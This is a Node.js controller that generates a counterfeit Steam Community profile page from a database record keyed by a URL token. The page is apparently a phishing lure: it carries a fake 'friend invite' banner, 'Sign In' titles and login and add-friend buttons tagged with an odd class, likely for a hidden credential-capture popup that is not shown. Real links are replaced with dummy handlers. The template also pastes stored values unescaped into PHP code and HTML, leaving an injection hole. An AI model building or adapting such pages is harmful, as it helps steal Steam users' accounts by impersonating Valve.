// controllers/steamController.js
const Steam = require('../models/Steam'); // Подключение модели Steam
const fs = require('fs');
const path = require('path');

// Обработчик для маршрута /:token
const getSteamProfileByToken = async (req, res) => {
  const { token } = req.params;

  try {
    const steamData = await Steam.findOne({ token }); // Ищем запись по токену

    if (!steamData) {
      return res.status(404).send('Data not found');
    }

    const phpContent = `
<?php
  $name = '${steamData.name}';
  $description = '${steamData.description}';
  $level = '${steamData.level}';
  $avatar_url = '${steamData.avatar_url}';
  $decor_url = '${steamData.decor_url}';
  $background_img_url = '${steamData.background_img_url}';
  $background_webm_url = '${steamData.background_webm_url}';
  $background_mp4_url = '${steamData.background_mp4_url}';
?>
      <!DOCTYPE html>
<html class="responsive" lang="zh-cn">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="theme-color" content="#171a21" />
    <title>Sing In</title>
    <link rel="icon" href="./img/logo_steam.png" type="image/x-png" />
    <link href="./css/motiva_sans.css" rel="stylesheet" type="text/css" />
    <link href="./css/buttons.css" rel="stylesheet" type="text/css" />
    <link href="./css/shared_global.css" rel="stylesheet" type="text/css" />
    <link href="./css/globalv2.css" rel="stylesheet" type="text/css" />
    <link href="./css/modalContent.css" rel="stylesheet" type="text/css" />
    <link href="./css/profilev2.css" rel="stylesheet" type="text/css" />
    <link href="./css/motiva_sans.css" rel="stylesheet" type="text/css" />
    <link href="./css/stickers.css" rel="stylesheet" type="text/css" />
    <link href="./css/shared_responsive.css" rel="stylesheet" type="text/css" />
    <link href="./css/header.css" rel="stylesheet" type="text/css" />
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <meta name="twitter:card" content="summary_large_image" />
    <meta
      name="Description"
      content="./img/SteamBg.jpg"
    />
    <meta name="twitter:site" content="@steam" />
    <meta property="og:title" content="Sign In" />
    <meta property="twitter:title" content="Sign In" />
    <meta property="og:type" content="website" />
    <meta property="fb:app_id" content="105386699540688" />
    <meta
      property="og:description"
      content=""
    />
    <meta
      property="twitter:description"
      content=""
    />
    <link
      rel="image_src"
      href="./img/SteamBg.jpg"
    />
    <meta
      property="og:image"
      content="./img/SteamBg.jpg"
    />
    <meta
      name="twitter:image"
      content="./img/SteamBg.jpg"
    />
    <style>
      .loader {
        position: absolute;
        top: calc(50% - 32px);
        left: calc(50% - 32px);
        width: 64px;
        height: 64px;
        border-radius: 50%;
        perspective: 800px;
      }

      .inner {
        position: absolute;
        box-sizing: border-box;
        width: 100%;
        height: 100%;
        border-radius: 50%;
      }

      .inner.one {
        left: 0%;
        top: 0%;
        animation: rotate-one 1s linear infinite;
        border-bottom: 5px solid #00ff00;
      }

      .inner.two {
        right: 0%;
        top: 0%;
        animation: rotate-two 1s linear infinite;
        border-right: 5px solid #00ff00;
      }

      .inner.three {
        right: 0%;
        bottom: 0%;
        animation: rotate-three 1s linear infinite;
        border-top: 5px solid #00ff00;
      }

      @keyframes rotate-one {
        0% {
          transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg);
        }

        100% {
          transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg);
        }
      }

      @keyframes rotate-two {
        0% {
          transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg);
        }

        100% {
          transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg);
        }
      }

      @keyframes rotate-three {
        0% {
          transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg);
        }

        100% {
          transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg);
        }
      }

      .fade-text {
        opacity: 0;
        animation: fade 3s infinite alternate;
      }

      .fade-text-warning {
        opacity: 0;
        animation: fade 1.5s infinite alternate;
      }

      @keyframes fade {
        0% {
          opacity: 0;
        }

        100% {
          opacity: 1;
        }
      }
    </style>
  </head>
  <body
    class="flat_page profile_page has_profile_background GameProfileTheme responsive_page"
  >
    <style>
      #scrollToTopBtn {
        display: none;
        position: fixed;
        bottom: 20px;
        right: 20px;
        z-index: 99;
        font-size: 18px;
        border: none;
        outline: none;
        background-color: #555;
        color: white;
        cursor: pointer;
        padding: 15px;
        border-radius: 50%;
        transition: background-color 0.5s ease;
      }

      .priglasitelny_banner .header {
        padding: 12px 12px 0px 12px;
        font-size: 22px;
        color: #fff;
      }

      .priglasitelny_banner .content {
        padding: 0px 12px 12px 12px;
        font-size: 14px;
        color: #fff;
      }

      .priglasitelny_banner {
        font-family: 'Motiva Sans', Sans-serif;
        font-weight: 300;
        padding: 12px;
        background: #5c6e84;
        border: 1px solid #8f98a0;
        box-shadow: 0 0 90px rgba(255, 255, 255, 0.2) inset;
      }

      .priglasitelny2_banner {
        animation: lightenAnimation 0.5s infinite alternate;
      }

      @keyframes lightenAnimation {
        from {
          background-color: #5c6e84;
        }

        to {
          background-color: #9bb2d3;
        }
      }
    </style>
    <div class="responsive_page_frame with_header">
      <div
        role="navigation"
        class="responsive_page_menu_ctn mainmenu"
        aria-label="手机菜单"
      >
        <div class="responsive_page_menu" id="responsive_page_menu">
          <div class="mainmenu_contents">
            <div class="mainmenu_contents_items">
              <a class="menuitem" onclick="scrollToTop()"> 登录 </a>
              <a
                class="menuitem supernav"
                onclick="scrollToTop()"
                data-tooltip-type="selector"
                data-tooltip-content=".submenu_Store"
              >
                商店
              </a>
              <div
                class="submenu_Store"
                style="display: none"
                data-submenuid="Store"
              >
                <a class="submenuitem" onclick="scrollToTop()"> 主页 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 探索队列 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 愿望单 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 点数商店 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 新闻 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 统计数据 </a>
              </div>
              <a
                class="menuitem supernav supernav_active"
                onclick="scrollToTop()"
                data-tooltip-type="selector"
                data-tooltip-content=".submenu_Community"
              >
                社区
              </a>
              <div
                class="submenu_Community"
                style="display: none"
                data-submenuid="Community"
              >
                <a class="submenuitem" onclick="scrollToTop()"> 主页 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 讨论 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 创意工坊 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 市场 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 实况直播 </a>
              </div>
              <a class="menuitem supernav" onclick="scrollToTop()"> 关于 </a>
              <a class="menuitem supernav" onclick="scrollToTop()"> 客服 </a>

              <div class="minor_menu_items">
                <div class="menuitem change_language_action">更改语言</div>
                <a
                  class="menuitem"
                  onclick="scrollToTop()"
                  target="_blank"
                  rel="noreferrer"
                  >获取 Steam 手机应用</a
                >
                <div
                  class="menuitem"
                  onclick="Responsive_RequestDesktopView();"
                >
                  查看桌面版网站
                </div>
              </div>
            </div>
            <div class="mainmenu_footer_spacer"></div>
            <div class="mainmenu_footer">
              <div class="mainmenu_footer_logo">
                <img src="./img/logo_valve_footer.png" />
              </div>
              © Valve
              Corporation。保留所有权利。所有商标均为其在美国及其它国家/地区的各自持有者所有。
              <span class="mainmenu_valve_links">
                <a onclick="scrollToTop()" target="_blank">隐私政策</a>
                &nbsp;| &nbsp;<a onclick="scrollToTop()" target="_blank"
                  >法律信息</a
                >
                &nbsp;| &nbsp;<a onclick="scrollToTop()" target="_blank"
                  >Steam 订户协议</a
                >
                &nbsp;| &nbsp;<a onclick="scrollToTop()" target="_blank"
                  >退款</a
                >
              </span>
            </div>
          </div>
        </div>
      </div>

      <div class="responsive_local_menu_tab"></div>

      <div class="responsive_page_menu_ctn localmenu">
        <div
          class="responsive_page_menu"
          id="responsive_page_local_menu"
          data-panel='{"onOptionsActionDescription":"#filter_toggle","onOptionsButton":"Responsive_ToggleLocalMenu()","onCancelButton":"Responsive_ToggleLocalMenu()"}'
        >
          <div
            class="localmenu_content"
            data-panel='{"maintainY":true,"bFocusRingRoot":true,"flow-children":"column"}'
          ></div>
        </div>
      </div>

      <div class="responsive_header">
        <div class="responsive_header_content">
          <div id="responsive_menu_logo">
            <img src="./img/header_menu_hamburger.png" height="100%" />
          </div>
          <div class="responsive_header_logo">
            <a onclick="scrollToTop()">
              <img
                src="./img/header_logo.png"
                height="36"
                border="0"
                alt="STEAM"
              />
            </a>
          </div>
        </div>
      </div>
      <div class="responsive_page_content_overlay"></div>
      <div class="responsive_fixonscroll_ctn nonresponsive_hidden"></div>
      <div class="responsive_page_content">
        <div
          role="banner"
          id="global_header"
          data-panel='{"flow-children":"row"}'
        >
          <div class="content">
            <div class="logo">
              <span id="logo_holder">
                <a onclick="scrollToTop()" aria-label="Steam 主页链接">
                  <img
                    src="./img/logo_steam.svg"
                    width="176"
                    height="44"
                    alt="Steam 主页链接"
                  />
                </a>
              </span>
            </div>
            <div
              role="navigation"
              class="supernav_container"
              aria-label="全局菜单"
            >
              <a
                class="menuitem supernav"
                onclick="scrollToTop()"
                data-tooltip-type="selector"
                data-tooltip-content=".submenu_Store"
              >
                商店
              </a>
              <div
                class="submenu_Store"
                style="display: none"
                data-submenuid="Store"
              >
                <a class="submenuitem" onclick="scrollToTop()"> 主页 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 探索队列 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 愿望单 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 点数商店 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 新闻 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 统计数据 </a>
              </div>
              <a
                class="menuitem supernav supernav_active"
                onclick="scrollToTop()"
                data-tooltip-type="selector"
                data-tooltip-content=".submenu_Community"
              >
                社区
              </a>
              <div
                class="submenu_Community"
                style="display: none"
                data-submenuid="Community"
              >
                <a class="submenuitem" onclick="scrollToTop()"> 主页 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 讨论 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 创意工坊 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 市场 </a>
                <a class="submenuitem" onclick="scrollToTop()"> 实况直播 </a>
              </div>
              <a class="menuitem supernav" onclick="scrollToTop()"> 关于 </a>
              <a class="menuitem supernav" onclick="scrollToTop()"> 客服 </a>
            </div>
            <div id="global_actions">
              <div
                role="navigation"
                id="global_action_menu"
                aria-label="帐户菜单"
              >
                <a
                  class="header_installsteam_btn header_installsteam_btn_green"
                  href="https://store.steampowered.com/about/"
                >
                  <div class="header_installsteam_btn_content">安装 Steam</div>
                </a>

                <a class="global_action_link ewyisfrvo26t">登录</a>
                &nbsp;|&nbsp;
                <span
                  class="pulldown global_action_link"
                  id="language_pulldown"
                  onclick="ShowMenu( this, 'language_dropdown', 'right' );"
                  >语言</span
                >
                <div
                  class="popup_block_new"
                  id="language_dropdown"
                  style="display: none"
                >
                  <div class="popup_body popup_menu">
                    <a
                      class="popup_menu_item tight"
                      href="?l=tchinese"
                      onclick="ChangeLanguage( 'tchinese' ); return false;"
                      >繁體中文（繁体中文）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=japanese"
                      onclick="ChangeLanguage( 'japanese' ); return false;"
                      >日本語（日语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=koreana"
                      onclick="ChangeLanguage( 'koreana' ); return false;"
                      >한국어（韩语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=thai"
                      onclick="ChangeLanguage( 'thai' ); return false;"
                      >ไทย（泰语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=bulgarian"
                      onclick="ChangeLanguage( 'bulgarian' ); return false;"
                      >български（保加利亚语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=czech"
                      onclick="ChangeLanguage( 'czech' ); return false;"
                      >Čeština（捷克语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=danish"
                      onclick="ChangeLanguage( 'danish' ); return false;"
                      >Dansk（丹麦语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=german"
                      onclick="ChangeLanguage( 'german' ); return false;"
                      >Deutsch（德语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=english"
                      onclick="ChangeLanguage( 'english' ); return false;"
                      >English（英语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=spanish"
                      onclick="ChangeLanguage( 'spanish' ); return false;"
                      >Español-España（西班牙语 - 西班牙）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=latam"
                      onclick="ChangeLanguage( 'latam' ); return false;"
                      >Español - Latinoamérica（西班牙语 - 拉丁美洲）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=greek"
                      onclick="ChangeLanguage( 'greek' ); return false;"
                      >Ελληνικά（希腊语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=french"
                      onclick="ChangeLanguage( 'french' ); return false;"
                      >Français（法语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=italian"
                      onclick="ChangeLanguage( 'italian' ); return false;"
                      >Italiano（意大利语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=indonesian"
                      onclick="ChangeLanguage( 'indonesian' ); return false;"
                      >Bahasa Indonesia（印度尼西亚语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=hungarian"
                      onclick="ChangeLanguage( 'hungarian' ); return false;"
                      >Magyar（匈牙利语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=dutch"
                      onclick="ChangeLanguage( 'dutch' ); return false;"
                      >Nederlands（荷兰语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=norwegian"
                      onclick="ChangeLanguage( 'norwegian' ); return false;"
                      >Norsk（挪威语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=polish"
                      onclick="ChangeLanguage( 'polish' ); return false;"
                      >Polski（波兰语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=portuguese"
                      onclick="ChangeLanguage( 'portuguese' ); return false;"
                      >Português（葡萄牙语 - 葡萄牙）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=brazilian"
                      onclick="ChangeLanguage( 'brazilian' ); return false;"
                      >Português-Brasil（葡萄牙语 - 巴西）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=romanian"
                      onclick="ChangeLanguage( 'romanian' ); return false;"
                      >Română（罗马尼亚语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=russian"
                      onclick="ChangeLanguage( 'russian' ); return false;"
                      >Русский（俄语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=finnish"
                      onclick="ChangeLanguage( 'finnish' ); return false;"
                      >Suomi（芬兰语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=swedish"
                      onclick="ChangeLanguage( 'swedish' ); return false;"
                      >Svenska（瑞典语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=turkish"
                      onclick="ChangeLanguage( 'turkish' ); return false;"
                      >Türkçe（土耳其语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=vietnamese"
                      onclick="ChangeLanguage( 'vietnamese' ); return false;"
                      >Tiếng Việt（越南语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="?l=ukrainian"
                      onclick="ChangeLanguage( 'ukrainian' ); return false;"
                      >Українська（乌克兰语）</a
                    >
                    <a
                      class="popup_menu_item tight"
                      href="https://www.valvesoftware.com/en/contact?contact-person=Translation%20Team%20Feedback"
                      target="_blank"
                      >报告翻译问题</a
                    >
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="priglasitelny_banner" id="priglasitelny_banner">
          <div class="invite_ctn">
            <div class="header">连接邀请</div>

            <div class="content">
              <p>您收到一个 Steam 好友邀请！</p>

              <div class="invite_banner_actions">
                <a class="btn_profile_action btn_medium ewyisfrvo26t">
                  <span>添加为好友</span>
                </a>
              </div>
            </div>
          </div>
        </div>
        <div
          id="webui_config"
          style="display: none"
          data-config='{"EUNIVERSE":1,"WEB_UNIVERSE":"public","LANGUAGE":"schinese","COUNTRY":"RU","MEDIA_CDN_COMMUNITY_URL":"https:\/\/cdn.akamai.steamstatic.com\/steamcommunity\/public\/","MEDIA_CDN_URL":"https:\/\/cdn.akamai.steamstatic.com\/","COMMUNITY_CDN_URL":"https:\/\/community.akamai.steamstatic.com\/","COMMUNITY_CDN_ASSET_URL":"https:\/\/cdn.akamai.steamstatic.com\/steamcommunity\/public\/assets\/","STORE_CDN_URL":"https:\/\/store.akamai.steamstatic.com\/","PUBLIC_SHARED_URL":"https:\/\/community.akamai.steamstatic.com\/public\/shared\/","COMMUNITY_BASE_URL":"https:\/\/steamcommunity.com\/","CHAT_BASE_URL":"https:\/\/steamcommunity.com\/","STORE_BASE_URL":"https:\/\/store.steampowered.com\/","STORE_CHECKOUT_BASE_URL":"https:\/\/checkout.steampowered.com\/","IMG_URL":"https:\/\/community.akamai.steamstatic.com\/public\/images\/","STEAMTV_BASE_URL":"https:\/\/steam.tv\/","HELP_BASE_URL":"https:\/\/help.steampowered.com\/","PARTNER_BASE_URL":"https:\/\/partner.steamgames.com\/","STATS_BASE_URL":"https:\/\/partner.steampowered.com\/","INTERNAL_STATS_BASE_URL":"https:\/\/steamstats.valve.org\/","IN_CLIENT":false,"USE_POPUPS":false,"STORE_ICON_BASE_URL":"https:\/\/shared.akamai.steamstatic.com\/store_item_assets\/steam\/apps\/","WEBAPI_BASE_URL":"https:\/\/api.steampowered.com\/","TOKEN_URL":"https:\/\/steamcommunity.com\/chat\/clientjstoken","BUILD_TIMESTAMP":1717031922,"PAGE_TIMESTAMP":1717392624,"IN_TENFOOT":false,"IN_GAMEPADUI":false,"IN_CHROMEOS":false,"IN_MOBILE_WEBVIEW":false,"PLATFORM":"windows","BASE_URL_STORE_CDN_ASSETS":"https:\/\/cdn.akamai.steamstatic.com\/store\/","EREALM":1,"LOGIN_BASE_URL":"https:\/\/login.steampowered.com\/","AVATAR_BASE_URL":"https:\/\/avatars.akamai.steamstatic.com\/","FROM_WEB":true,"WEBSITE_ID":"Community","BASE_URL_SHARED_CDN":"https:\/\/shared.akamai.steamstatic.com\/","CLAN_CDN_ASSET_URL":"https:\/\/clan.akamai.steamstatic.com\/","SNR":"2_100300_DefaultAction_"}'
          data-userinfo="[]"
        ></div>
        <div
          id="application_config"
          style="display: none"
          data-config='{"EUNIVERSE":1,"WEB_UNIVERSE":"public","LANGUAGE":"schinese","COUNTRY":"RU","MEDIA_CDN_COMMUNITY_URL":"https:\/\/cdn.akamai.steamstatic.com\/steamcommunity\/public\/","MEDIA_CDN_URL":"https:\/\/cdn.akamai.steamstatic.com\/","COMMUNITY_CDN_URL":"https:\/\/community.akamai.steamstatic.com\/","COMMUNITY_CDN_ASSET_URL":"https:\/\/cdn.akamai.steamstatic.com\/steamcommunity\/public\/assets\/","STORE_CDN_URL":"https:\/\/store.akamai.steamstatic.com\/","PUBLIC_SHARED_URL":"https:\/\/community.akamai.steamstatic.com\/public\/shared\/","COMMUNITY_BASE_URL":"https:\/\/steamcommunity.com\/","CHAT_BASE_URL":"https:\/\/steamcommunity.com\/","STORE_BASE_URL":"https:\/\/store.steampowered.com\/","STORE_CHECKOUT_BASE_URL":"https:\/\/checkout.steampowered.com\/","IMG_URL":"https:\/\/community.akamai.steamstatic.com\/public\/images\/","STEAMTV_BASE_URL":"https:\/\/steam.tv\/","HELP_BASE_URL":"https:\/\/help.steampowered.com\/","PARTNER_BASE_URL":"https:\/\/partner.steamgames.com\/","STATS_BASE_URL":"https:\/\/partner.steampowered.com\/","INTERNAL_STATS_BASE_URL":"https:\/\/steamstats.valve.org\/","IN_CLIENT":false,"USE_POPUPS":false,"STORE_ICON_BASE_URL":"https:\/\/shared.akamai.steamstatic.com\/store_item_assets\/steam\/apps\/","WEBAPI_BASE_URL":"https:\/\/api.steampowered.com\/","TOKEN_URL":"https:\/\/steamcommunity.com\/chat\/clientjstoken","BUILD_TIMESTAMP":1717031922,"PAGE_TIMESTAMP":1717392624,"IN_TENFOOT":false,"IN_GAMEPADUI":false,"IN_CHROMEOS":false,"IN_MOBILE_WEBVIEW":false,"PLATFORM":"windows","BASE_URL_STORE_CDN_ASSETS":"https:\/\/cdn.akamai.steamstatic.com\/store\/","EREALM":1,"LOGIN_BASE_URL":"https:\/\/login.steampowered.com\/","AVATAR_BASE_URL":"https:\/\/avatars.akamai.steamstatic.com\/","FROM_WEB":true,"WEBSITE_ID":"Community","BASE_URL_SHARED_CDN":"https:\/\/shared.akamai.steamstatic.com\/","CLAN_CDN_ASSET_URL":"https:\/\/clan.akamai.steamstatic.com\/","SNR":"2_100300_DefaultAction_"}'
          data-userinfo="[]"
          data-community="[]"
          data-loyaltystore='{"webapi_token":""}'
          data-steam_notifications="null"
        ></div>
        <link
          href="https://community.akamai.steamstatic.com/public/css/applications/community/main.css?v=Hpc3R3GOITg3&amp;l=schinese"
          rel="stylesheet"
          type="text/css"
        />
        <div data-featuretarget="profile-rewards"></div>
        <div id="application_root">
          <div class="FullModalOverlay" style="display: none">
            <div class="ModalOverlayContent ModalOverlayBackground"></div>
          </div>
        </div>

        <div
          role="main"
          class="responsive_page_template_content"
          id="responsive_page_template_content"
          data-panel='{"autoFocus":true}'
        >
          <style>
            body.GameProfileTheme {
              --gradient-right: rgba(255, 0, 80, 0.48);
              --gradient-left: rgba(113, 41, 193, 0.32);
              --gradient-background: rgba(0, 0, 0, 0.3);
              --gradient-background-right: rgba(255, 0, 80, 0.48);
              --gradient-background-left: rgba(113, 41, 193, 0.32);
              --color-showcase-header: rgba(255, 0, 80, 0.48);
              --gradient-showcase-header-left: rgba(113, 41, 193, 0.32);
              --btn-background: rgba(0, 0, 0, 0.2);
              --btn-background-hover: rgb(255, 255, 255, 0.1);
              --btn-outline: rgb(255, 255, 255, 0.1);
            }
          </style>
          <div
            class="no_header profile_page has_profile_background full_width_background"
            style=""
          >
            <div class="profile_animated_background">
            <video
                playsinline=""
                autoplay=""
                muted=""
                loop=""
                id='backgorundImg'
                poster="${steamData.background_img_url}"
              >
                <source
                id='backgorundWebm'
                  src="${steamData.background_webm_url}"
                  type="video/webm"
                />
                <source
                id='backgorundMp4'
                  src="${steamData.background_mp4_url}"
                  type="video/mp4"
                />
              </video>
            </div>
            <div class="profile_header_bg">
              <div class="profile_header_bg_texture">
                <div class="profile_header">
                  <div class="profile_header_content">
                    <div class="profile_header_centered_persona">
                      <div class="persona_name" style="font-size: 24px">
                      <span class="actual_persona_name" id="name">${steamData.name}</span>
                        <span class="namehistory_link" onclick="scrollToTop()">
                          <img
                            id="getnamehistory_arrow"
                            src="./img/arrowDn9x5.gif"
                            width="9"
                            height="5"
                            border="0"
                          />
                        </span>
                        <div
                          id="NamePopup"
                          class="popup_block_new"
                          style="display: none"
                        >
                          <div class="popup_body popup_menu">
                            <div>此用户也使用过以下名称：</div>
                            <div id="NamePopupAliases"></div>
                            <div
                              style="display: none"
                              id="NamePopupClearAliases"
                            ></div>
                            <div style="clear: both"></div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div class="playerAvatar profile_header_size offline">
    <div class="playerAvatarAutoSizeInner">
    <div class="profile_avatar_frame">
                          <img
                          id="decorImage"
                            src="${steamData.decor_url}"
                          />
                        </div>
      <img id="avatarImage" src="${steamData.avatar_url}" />
    </div>
  </div>

                    <div class="profile_header_badgeinfo">
                      <div class="profile_header_badgeinfo_badge_area">
                        <a
                          data-panel='{"focusable":true,"clickOnActivate":true}'
                          class="persona_level_btn"
                          onclick="scrollToTop()"
                        >
                          <div class="persona_name persona_level">
  <div class="friendPlayerLevel" id="levelClass">
    <span class="friendPlayerLevelNum">${steamData.level}</span>
  </div>
  级
</div>
                        </a>
                        <div class="profile_header_badge">
                          <a onclick="scrollToTop()" class="favorite_badge">
                            <div
                              class="favorite_badge_icon"
                              data-tooltip-html="Steam Awards 2022 - 50+<br>
2022 年 Steam 大奖 徽章（50 级）"
                            >
                              <img
                                src="./img/531169f65f1cb14c6f23b4971901783dc264f9ef.png"
                                class="badge_icon small"
                              />
                            </div>
                            <div class="favorite_badge_description">
                              <div class="name ellipsis">
                                Steam Awards 2022 - 50+
                              </div>
                              <div class="xp">5,000 点经验值</div>
                            </div>
                          </a>
                        </div>
                      </div>
                      <div class="profile_header_actions"></div>
                    </div>

                    <div class="profile_header_summary">
                      <div
                        class="persona_name persona_name_spacer"
                        style="font-size: 24px"
                      >
                        <span class="actual_persona_name">&nbsp;</span>
                      </div>
                      <div class="header_real_name_spacer">&nbsp;</div>
                      <div class="profile_summary" id="description">
                      ${steamData.description}
  </div>
                      <div class="profile_summary_footer">
                        <span
                          data-panel='{"focusable":true,"clickOnActivate":true}'
                          class="whiteLink"
                        ></span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="profile_content has_profile_background">
              <div class="profile_content_inner">
                <div class="profile_rightcol">
                  <div class="responsive_status_info">
                    <div class="profile_in_game persona offline">
                      <div class="profile_in_game_header">当前离线</div>
                    </div>
                  </div>

                  <div class="responsive_count_link_area">
                    <div
                      data-panel='{"maintainX":true,"bFocusRingRoot":true,"flow-children":"row"}'
                      class="profile_awards"
                    >
                      <div
                        class="profile_count_link_preview_ctn"
                        data-panel='{"focusable":true,"clickOnActivate":true}'
                      >
                        <div
                          data-panel='{"focusable":true,"clickOnActivate":true}'
                          class="profile_count_link ellipsis"
                        >
                          <a onclick="scrollToTop()">
                            <span class="count_link_label">个人资料奖励</span
                            >&nbsp;
                            <span class="profile_count_link_total"> 19 </span>
                          </a>
                        </div>
                        <div class="profile_count_link_preview">
                          <div
                            class="profile_badges_badge"
                            data-tooltip-html="该用户的个人资料已获得 2 次“金独角兽”奖。"
                          >
                            <a onclick="scrollToTop()">
                              <img
                                src="./img/11.png"
                                class="award_icon small"
                                data-animate-on-hover-src="./img/11.png"
                              />
                            </a>
                          </div>
                          <div
                            class="profile_badges_badge"
                            data-tooltip-html="该用户的个人资料已获得“点数拿去”奖。"
                          >
                            <a onclick="scrollToTop()">
                              <img
                                src="./img/17.png"
                                class="award_icon small"
                                data-animate-on-hover-src="./img/17.png"
                              />
                            </a>
                          </div>
                          <div
                            class="profile_badges_badge"
                            data-tooltip-html="该用户的个人资料已获得 2 次“就是有范儿”奖。"
                          >
                            <a onclick="scrollToTop()">
                              <img
                                src="./img/20.png"
                                class="award_icon small"
                                data-animate-on-hover-src="./img/20.png"
                              />
                            </a>
                          </div>
                          <div
                            class="profile_badges_badge last"
                            data-tooltip-html="该用户的个人资料已获得“聪明过人”奖。"
                          >
                            <a onclick="scrollToTop()">
                              <img
                                src="./img/13.png"
                                class="award_icon small"
                                data-animate-on-hover-src="./img/13.png"
                              />
                            </a>
                          </div>
                          <div style="clear: left"></div>
                        </div>
                      </div>
                    </div>

                    <div
                      data-panel='{"maintainX":true,"bFocusRingRoot":true,"flow-children":"row"}'
                      class="profile_badges"
                    >
                      <div
                        class="profile_count_link_preview_ctn"
                        data-panel='{"focusable":true,"clickOnActivate":true}'
                      >
                        <div
                          data-panel='{"focusable":true,"clickOnActivate":true}'
                          class="profile_count_link ellipsis"
                        >
                          <a onclick="scrollToTop()">
                            <span class="count_link_label">徽章</span>&nbsp;
                            <span class="profile_count_link_total"> 56 </span>
                          </a>
                        </div>
                        <div class="profile_count_link_preview">
                          <div
                            class="profile_badges_badge"
                            data-tooltip-html="Winter Sale 2023 - Level 10<br>
2023 年冬季特卖 徽章（21 级）"
                          >
                            <a onclick="scrollToTop()">
                              <img
                                src="./img/d4bb6ab0a94fe2a135a53f73782baf86c0b46305.png"
                                class="badge_icon small"
                              />
                            </a>
                          </div>
                          <div
                            class="profile_badges_badge"
                            data-tooltip-html="Winter Sale 2023 - Foil 1+<br>
2023 年冬季特卖 闪亮徽章"
                          >
                            <a onclick="scrollToTop()">
                              <img
                                src="./img/e5e263c23b1de29ee9f9ed0d0f7f1c9b88a387e2.png"
                                class="badge_icon small"
                              />
                            </a>
                          </div>
                          <div
                            class="profile_badges_badge"
                            data-tooltip-html="收藏代理人<br>
已拥有 56 款游戏"
                          >
                            <a onclick="scrollToTop()">
                              <img
                                src="./img/50_54.png"
                                class="badge_icon small"
                              />
                            </a>
                          </div>
                          <div
                            class="profile_badges_badge last"
                            data-tooltip-html="2023 年 Steam 年度回顾<br>
因查看您的 2023 年 Steam 年度回顾而获得奖励"
                          >
                            <a onclick="scrollToTop()">
                              <img
                                src="./img/YIR2023_54.png"
                                class="badge_icon small"
                              />
                            </a>
                          </div>
                          <div style="clear: left"></div>
                        </div>
                      </div>
                    </div>

                    <div
                      data-panel='{"maintainX":true,"bFocusRingRoot":true,"flow-children":"row"}'
                      id="responsive_groupfriends_element_ctn"
                    ></div>

                    <div
                      data-panel='{"maintainX":true,"bFocusRingRoot":true,"flow-children":"row"}'
                      class="profile_item_links"
                    >
                      <div
                        data-panel='{"focusable":true,"clickOnActivate":true}'
                        class="profile_count_link ellipsis"
                      >
                        <a onclick="scrollToTop()">
                          <span class="count_link_label">游戏</span>&nbsp;
                          <span class="profile_count_link_total"> 56 </span>
                        </a>
                      </div>
                      <div
                        data-panel='{"focusable":true,"clickOnActivate":true}'
                        class="profile_count_link ellipsis"
                      >
                        <a onclick="scrollToTop()">
                          <span class="count_link_label">库存</span>&nbsp;
                          <span class="profile_count_link_total">
                            &nbsp;
                            <!-- so the line spaces like the rest -->
                          </span>
                        </a>
                      </div>
                      <div
                        data-panel='{"focusable":true,"clickOnActivate":true}'
                        class="profile_count_link ellipsis"
                      >
                        <a onclick="scrollToTop()">
                          <span class="count_link_label">截图</span>&nbsp;
                          <span class="profile_count_link_total"> 25 </span>
                        </a>
                      </div>
                      <div
